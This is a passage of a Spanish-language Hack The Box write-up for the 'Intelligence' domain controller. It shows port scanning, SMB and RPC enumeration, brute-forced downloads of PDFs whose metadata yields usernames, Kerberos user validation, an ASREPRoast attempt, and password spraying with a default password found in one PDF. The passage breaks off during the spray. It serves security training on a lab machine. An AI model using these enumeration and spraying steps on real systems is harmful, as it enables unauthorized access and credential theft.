<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49669,49691,49692,49696,49713,50192 10.10.10.248 <span class="nt">-oN</span> targeted
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguelrega7: 
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-05 18:48 CST
Nmap scan report <span class="k">for </span>10.10.10.248
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-08-06 07:48:52Z<span class="o">)</span>
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49669/tcp filtered unknown
49691/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open     msrpc         Microsoft Windows RPC
49696/tcp filtered unknown
49713/tcp filtered unknown
50192/tcp filtered unknown
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   <span class="nb">date</span>: 2024-08-06T07:49:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los nombres de dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.10.248 dc.intelligence.htb intelligence.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.10.248 dc.intelligence.htb intelligence.htb
</code></pre></div></div>

<ul>
  <li>No podemos enumerar por <code class="language-plaintext highlighter-rouge">smb</code> con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> <span class="s2">"miguel"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\m</span>iguel: STATUS_LOGON_FAILURE 
</code></pre></div></div>

<ul>
  <li>Si probamos otra herramienta vemos que no nos reporta ningún recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.248 <span class="nt">-N</span>
Anonymous login successful

	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
do_connect: Connection to 10.10.10.248 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.248 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="se">\]</span> Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>|] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>/] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB connections<span class="o">(</span>s<span class="o">)</span> and 0 authenticated session<span class="o">(</span>s<span class="o">)</span>                                                          
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed 1 connections        
</code></pre></div></div>

<ul>
  <li>Si intentamos enumerar por el protocolo RPC no nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.248
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/1.png" />
</p>

<ul>
  <li>Estas son las tecnologías que esta usando.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.248</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.248</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">contact</span><span class="vi">@intelligence</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.248</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Intelligence</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>En el apartado de las imágenes hay 2 botones los cuales nos dice Download son archivos .pdf este es su contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/3.png" />
</p>

<ul>
  <li>Vamos a descargarlos para ver los metadatos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget http://10.10.10.248/documents/2020-01-01-upload.pdf
<span class="nt">--2024-08-05</span> 19:20:52--  http://10.10.10.248/documents/2020-01-01-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 <span class="o">(</span>26K<span class="o">)</span> <span class="o">[</span>application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf           100%[<span class="o">=======================================================&gt;]</span>  26.21K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    

2024-08-05 19:20:53 <span class="o">(</span>256 KB/s<span class="o">)</span> - ‘2020-01-01-upload.pdf’ saved <span class="o">[</span>26835/26835]

                                                                                                                                
❯ wget http://10.10.10.248/documents/2020-12-15-upload.pdf
<span class="nt">--2024-08-05</span> 19:21:00--  http://10.10.10.248/documents/2020-12-15-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 <span class="o">(</span>27K<span class="o">)</span> <span class="o">[</span>application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf           100%[<span class="o">=======================================================&gt;]</span>  26.60K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    

2024-08-05 19:21:00 <span class="o">(</span>246 KB/s<span class="o">)</span> - ‘2020-12-15-upload.pdf’ saved <span class="o">[</span>27242/27242]
</code></pre></div></div>

<ul>
  <li>Encontramos el nombre de los creadores.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-01-01-upload.pdf
Directory                       : <span class="nb">.</span>
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 11:00:00-06:00
File Access Date/Time           : 2024:08:05 19:20:53-06:00
File Inode Change Date/Time     : 2024:08:05 19:20:53-06:00
File Permissions                : <span class="nt">-rw-rw-r--</span>
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

❯ exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-12-15-upload.pdf
Directory                       : <span class="nb">.</span>
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 11:00:00-06:00
File Access Date/Time           : 2024:08:05 19:21:00-06:00
File Inode Change Date/Time     : 2024:08:05 19:21:00-06:00
File Permissions                : <span class="nt">-rw-rw-r--</span>
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos los nombres de creadores lo mas probable es que sean usuarios del dominio pero podemos hacer Fuzzing para encontrar mas PDFs en caso de que los allá y descargarlos.</p>
  </li>
  <li>
    <p>Vamos a descargar solo los que existan para extraer los nombres de los creadores.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>2020..2022<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>j <span class="k">in</span> <span class="o">{</span>01..12<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>k <span class="k">in</span> <span class="o">{</span>01..31<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"http://10.10.10.248/documents/</span><span class="nv">$i</span><span class="s2">-</span><span class="nv">$j</span><span class="s2">-</span><span class="nv">$k</span><span class="s2">-upload.pdf"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> | xargs <span class="nt">-n</span> 1 <span class="nt">-P</span> 20 wget
</code></pre></div></div>

<ul>
  <li>Como son demasiados usuarios vamos a filtrar por sus nombres y meterlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool <span class="k">*</span> .pdf | <span class="nb">grep</span> <span class="s2">"Creator"</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span>
William.Lee
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
Anita.Roberts
Teresa.Williamson
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Error: File not found - .pdf
Jason.Patterson
Stephanie.Young
Kaitlyn.Zimmerman
Travis.Evans
Kelly.Long
Danny.Matthews
Travis.Evans
Jessica.Moody
Thomas.Valenzuela
Anita.Roberts
Stephanie.Young
David.Reed
Jose.Williams
Veronica.Patel
Ian.Duncan
Richard.Williams
</code></pre></div></div>

<ul>
  <li>Como hay repeticiones vamos aplicar un <code class="language-plaintext highlighter-rouge">sort</code> para eliminar las repeticiones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool <span class="k">*</span> .pdf | <span class="nb">grep</span> <span class="s2">"Creator"</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
Error: File not found - .pdf
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool <span class="k">*</span>.pdf | <span class="nb">grep</span> <span class="s2">"Creator"</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt
</code></pre></div></div>

<ul>
  <li>Ahora vamos a comprobar que los usuarios sean validos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> dc.intelligence.htb <span class="nt">-d</span> intelligence.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 08/05/24 - Ronnie Flathers @ropnop

2024/08/05 19:47:26 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/08/05 19:47:26 <span class="o">&gt;</span>  	dc.intelligence.htb:88

2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Anita.Roberts@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Ian.Duncan@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	David.Wilson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	David.Reed@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Brian.Baker@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Darryl.Harris@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Daniel.Shelton@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Brian.Morris@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	David.Mcbride@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Danny.Matthews@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jason.Wright@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jason.Patterson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jose.Williams@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Kelly.Long@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Kaitlyn.Zimmerman@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jennifer.Thomas@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	John.Coleman@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jessica.Moody@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Richard.Williams@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Nicole.Brock@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Samuel.Richardson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Stephanie.Young@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Teresa.Williamson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Scott.Scott@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Thomas.Valenzuela@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Travis.Evans@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Veronica.Patel@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Thomas.Hall@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Tiffany.Molina@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	William.Lee@intelligence.htb
</code></pre></div></div>

<ul>
  <li>
    <p>Son existentes así que vamos a probar un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> <a href="https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html">https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html</a>.</p>
  </li>
  <li>
    <p>Ningún usuario es vulnerable.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers intelligence.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] User Anita.Roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Brian.Morris doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Danny.Matthews doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User David.Mcbride doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User David.Wilson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jason.Patterson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jennifer.Thomas doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User John.Coleman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kaitlyn.Zimmerman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Nicole.Brock doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Samuel.Richardson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Stephanie.Young doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Thomas.Hall doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tiffany.Molina doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Veronica.Patel doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<ul>
  <li>En los PDFs sabemos que tienen contenido así que vamos a utilizar la siguiente herramienta para ver si en los textos hay alguna contraseña <a href="https://github.com/jalan/pdftotext">https://github.com/jalan/pdftotext</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>file <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$file</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">grep</span> <span class="nt">-v</span> users.txt | <span class="k">while </span><span class="nb">read </span>filename<span class="p">;</span> <span class="k">do </span>pdftotext <span class="nv">$filename</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Si examinamos los <code class="language-plaintext highlighter-rouge">.txt</code> vemos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 2020-06-04-upload.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ New Account Guide
   2   │ Welcome to Intelligence Corp!
   3   │ Please login using your username and the default password of:
   4   │ NewIntelligenceCorpUser9876
   5   │ After logging <span class="k">in </span>please change your password as soon as possible.
   6   │ 
   7   │ ^L
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<h2 id="smb">SMB</h2>

<ul>
  <li>Como tenemos una contraseña podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para saber de quien es la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\A</span>nita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\B</span>rian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\B</span>rian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>aniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>anny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>arryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>avid.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>avid.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>avid.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\I</span>an.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
